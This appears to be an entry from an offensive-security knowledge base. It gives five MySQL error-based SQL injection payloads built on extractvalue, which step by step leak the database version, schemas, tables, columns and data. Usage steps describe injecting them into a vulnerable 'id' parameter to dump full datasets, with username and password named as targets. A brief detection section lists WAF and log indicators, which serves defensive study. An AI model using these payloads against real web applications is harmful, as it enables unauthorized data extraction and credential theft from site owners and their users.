---
id: 2f06f235-f676-434d-99b7-ca302725514a
name: MySQL-ExtractValue-Blind-SQL-Injection-Payloads
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:34.500071+00:00'
updated_at: '2023-04-10T20:22:51.680945+00:00'
platforms:
  - Web
  - MySQL
tags:
  - sqli
  - blind-injection
  - error-based
  - extractvalue
validated: true
---

# MySQL-ExtractValue-Blind-SQL-Injection-Payloads

## Code

```sql
?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
```

## Description

This SQL code snippet contains a series of payloads for error-based blind SQL injection using MySQL's ExtractValue function. It forces XPATH errors to leak database information (version, schemas, tables, columns, and data) via concatenated strings in error messages. The payloads are designed for injection into vulnerable URL parameters like 'id', using CHAR(126) (~) as a delimiter for easy parsing.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| data_offset | Starting index for LIMIT clause to enumerate results one by one | 0, 1, 2... |
| data_column | Discovered schema name for table/column enumeration | 'information_schema' or target schema like 'users_db' |
| data_table | Discovered table name for column/data extraction | 'users' |
| data_info | Target column for data extraction | 'username' or 'password' |

## Usage

Inject these payloads sequentially into a vulnerable parameter (e.g., http://target.com/vuln.php?id=<payload>). Start with the version payload to confirm injection. Use a proxy to capture error responses. Increment data_offset to dump full datasets. Substitute placeholders like data_column after discovering prior elements. Ideal for web apps with error reporting enabled.

## Detection

- Web application logs showing SQL errors with XPATH syntax issues or unexpected CHAR(126) in messages.
- WAF alerts for injection patterns like 'extractvalue' or 'concat(CHAR'.
- Anomalous database queries in audit logs accessing information_schema repeatedly.
- Increased error rates from rand() or LIMIT clauses in UNION/SELECT contexts.

## Related

- [[procedures/MySQL-Error-Based-SQL-Injection-with-ExtractValue]]
